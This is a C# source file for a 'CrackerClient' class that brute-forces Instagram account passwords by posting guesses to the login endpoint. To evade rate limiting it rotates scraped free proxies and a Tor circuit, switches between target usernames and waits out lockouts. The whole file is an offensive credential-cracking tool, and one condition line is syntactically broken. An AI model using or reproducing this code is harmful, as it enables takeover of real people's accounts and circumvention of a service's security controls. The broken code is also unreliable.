using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using HtmlAgilityPack;
using Jil;
using RestSharp;
using OpenQA.Selenium.Chrome;
using Tor;
using ZachLib;

namespace CrackingLib
{
    public class CrackerClient
    {
        private RestClient _client { get; set; }
        private IWebProxy[] Proxies { get; set; }
        private IEnumerator<IWebProxy> ProxiesEnumerator { get; set; }
        private static readonly CookieContainer COOKIES = new CookieContainer();
        //private ChromeDriver WebDriver { get; set; }
        private Client TorClient { get; set; }
        private string[] Usernames { get; set; }
        private int UsernameIndex { get; set; }
        private DateTime[] UsernameRefreshTimes { get; set; }
        public int VariantsTried { get; private set; }
        private Stopwatch ProxyTimer { get; set; }
        private int ProxyIndex { get; set; }
        private SortedDictionary<int, List<long>> ProxyTimes { get; set; }
        private int CurrentUserIteration { get; set; }
        private int CurrentProxyIteration { get; set; }
        private SortedSet<int> DontLogTimes { get; set; }

        public CrackerClient(params string[] usernames)
        {
            Usernames = usernames;
            UsernameIndex = 0;
            UsernameRefreshTimes = new DateTime[usernames.Length];

            CurrentProxyIteration = 0;
            VariantsTried = 0;
            CurrentUserIteration = 0;

            DontLogTimes = new SortedSet<int>();
            ProxyTimes = new SortedDictionary<int, List<long>>();
            //WebDriver = new ChromeDriver();
            Proxies = GetProxies();
            if (File.Exists("ProxyTimes.txt"))
            {
                var proxyDict = Utils.LoadDictionary("ProxyTimes.txt");
                for (int i = 0; i < Proxies.Length; ++i)
                {
                    string key = Proxies[i].GetProxy(new Uri("https://google.com")).ToString();
                    if (proxyDict.TryGetValue(key, out string value) && value != "-1")
                        DontLogTimes.Add(i);
                }
            }

            ProxiesEnumerator = ((IEnumerable<IWebProxy>)Proxies).GetEnumerator();
            ProxyTimer = new Stopwatch();
            ProxyIndex = 0;

            _client = new RestClient("https://www.instagram.com")
            {
                FollowRedirects = true,
                CookieContainer = COOKIES,
                UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
            };

            _client.AddDefaultHeader(
                "X-CSRFToken", 
                _client.Execute(
                    new RestRequest("/")
                ).Cookies.First(
                    c => c.Name == "csrftoken"
                ).Value
            );
            _client.AddDefaultHeader("X-Instagram-AJAX", "2");
            _client.AddDefaultHeader("X-Requested-With", "XMLHttpRequest");

            _client.AddDefaultParameter("queryParams", "{}", ParameterType.GetOrPost);
            _client.AddDefaultParameter("username", usernames[0]);
            ProxiesEnumerator.MoveNext();
            _client.Proxy = ProxiesEnumerator.Current;
            _client.FollowRedirects = false;
        }

        public void SaveProxyTimes() =>
            File.AppendAllLines(
                "ProxyTimes.txt",
                ProxyTimes.Select(
                    kv => Proxies[kv.Key].GetProxy(new Uri("https://google.com")) + " :=: " + kv.Value.Average().ToString()
                )
            );

        public void TestRateLimits()
        {
            IRestResponse response = null;
            RestRequest request = new RestRequest("/accounts/login/ajax/", Method.POST);
            //request.AddParameter(UsernameParameter);
            request.AddParameter("password", "weezer", ParameterType.GetOrPost);
            //request.AddParameter("queryParams", "{\"source\":\"auth_switcher\"}", ParameterType.GetOrPost);
            int i = 0;
            do
            {
                response = _client.Execute(request);
            } while (response.IsSuccessful && ++i < 32);
            Console.WriteLine("{0} requests", i);
            ProxiesEnumerator.MoveNext();
            _client.Proxy = ProxiesEnumerator.Current;
        }

        public bool TryPasswordVariant(string password)
        {
            //Cookies = new CookieContainer();

            RestRequest request = new RestRequest("/accounts/login/ajax/", Method.POST);
            request.AddParameter("password", password, ParameterType.GetOrPost);
            ProxyTimer.Restart();
            var response = _client.Execute(request);
            ProxyTimer.Stop();
            if (!response.IsSuccessful || response.ContentLength == 127)
            {
                if (++ProxyIndex >= Proxies.Length)
                {
                    ProxyIndex = 0;
                    SaveProxyTimes();
                }

                var lastProxy = _client.Proxy;
                _client.Proxy = Proxies[ProxyIndex];
                ProxyTimer.Restart();
                response = _client.Execute(request);
                ProxyTimer.Stop();

                if (!response.IsSuccessful || response.ContentLength == 127)
                {
                    _client.Proxy = lastProxy;
                    --ProxyIndex;

                    if (CurrentUserIteration > Proxies.Length / 2 || )
                    {
                        var now = DateTime.Now;
                        UsernameRefreshTimes[UsernameIndex] = now.AddMinutes(12);
                        if (++UsernameIndex == Usernames.Length)
                            UsernameIndex = 0;
                        var nextRefresh = UsernameRefreshTimes[UsernameIndex];
                        if (nextRefresh > now)
                        {
                            Console.WriteLine("Sleeping until {0}", nextRefresh);
                            Thread.Sleep((int)(nextRefresh - now).TotalMilliseconds);
                        }

                        Console.WriteLine("{0} variants tested\t-\tswitching to account {1}", VariantsTried, Usernames[UsernameIndex]);
                        _client.DefaultParameters.First(p => p.Name == "username").Value = Usernames[UsernameIndex];
                        ProxyTimer.Restart();
                        response = _client.Execute(request);
                        ProxyTimer.Stop();
                    }
                    else
                    {
                        int lastIndex = ProxyIndex;
                        do
                        {
                            _client.Proxy = Proxies[ProxyIndex];
                            ProxyTimer.Restart();
                            response = _client.Execute(request);
                            ProxyTimer.Stop();
                        } while ((!response.IsSuccessful || response.ContentLength == 127) && ++ProxyIndex < Proxies.Length);

                        if (!response.IsSuccessful)
                        {
                            ProxyIndex = 0;
                            do
                            {
                                _client.Proxy = Proxies[ProxyIndex];
                                ProxyTimer.Restart();
                                response = _client.Execute(request);
                                ProxyTimer.Stop();
                            } while ((!response.IsSuccessful || response.ContentLength == 127) && ++ProxyIndex < lastIndex);
                        }
                    }

                    if (!response.IsSuccessful || response.ContentLength == 127)
                    {
                        SaveProxyTimes();
                        Console.WriteLine("Total failure, last password was {0}; {1} total variants tried", password, VariantsTried);
                        Console.ReadLine();
                    }
                }
            }

            if (!DontLogTimes.Contains(ProxyIndex))
            {
                if (ProxyTimes.ContainsKey(ProxyIndex))
                    ProxyTimes[ProxyIndex].Add(ProxyTimer.ElapsedMilliseconds);
                else
                    ProxyTimes.Add(ProxyIndex, new List<long>() { ProxyTimer.ElapsedMilliseconds });
            }

            ++VariantsTried;
            ++CurrentUserIteration;
            ++CurrentProxyIteration;
            return response.ContentLength > 60;
        }

        private IWebProxy[] GetProxies()
        {
            RestClient proxyScraper = new RestClient("https://free-proxy-list.net");
            List<IWebProxy> proxies = new List<IWebProxy>();
            var doc = new HtmlDocument();

            void AddProxies(HtmlNodeCollection nodes)
            {
                foreach (var node in nodes)
                {
                    proxies.Add(new WebProxy(node.FirstChild.InnerText, Convert.ToInt32(node.ChildNodes[1].InnerText)));
                }
            }

            doc.LoadHtml(
                proxyScraper.Execute(
                    new RestRequest(
                        "/anonymous-proxy.html",
                        Method.GET
                    )
                ).Content
            );
            AddProxies(doc.DocumentNode.SelectNodes("/html/body/section/div/div[2]/table/tbody/tr"));

            doc.LoadHtml(
                proxyScraper.Execute(
                    new RestRequest(
                        "/",
                        Method.GET
                    )
                ).Content
            );
            AddProxies(doc.DocumentNode.SelectNodes("/html/body/section/div/div[2]/table/tbody/tr"));

            proxyScraper = new RestClient("https://socks-proxy.net");
            doc.LoadHtml(
                proxyScraper.Execute(
                    new RestRequest(
                        "/",
                        Method.GET
                    )
                ).Content
            );
            AddProxies(doc.DocumentNode.SelectNodes("/html/body/section/div/div[2]/table/tbody/tr"));
            proxyScraper = new RestClient("https://sslproxies.org");
            doc.LoadHtml(
                proxyScraper.Execute(
                    new RestRequest(
                        "/",
                        Method.GET
                    )
                ).Content
            );
            AddProxies(doc.DocumentNode.SelectNodes("/html/body/section/div/div[2]/table/tbody/tr"));

            /*var createParams = new ClientCreateParams(
                @"C:\Users\ZACH-GAMING\Documents\TEMP\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
                9051,
                ""
            );
            TorClient = Client.Create(createParams);*/
            var createParams = new ClientRemoteParams("127.0.0.1", 9051);
            TorClient = Client.CreateForRemote(createParams);
            //TorClient.Proxy.Port = 7777;
            SpinWait.SpinUntil(() => TorClient.Proxy.IsRunning, 1000);
            proxies.Insert(0, TorClient.Proxy.WebProxy);

            return proxies.ToArray();
        }
    }
}
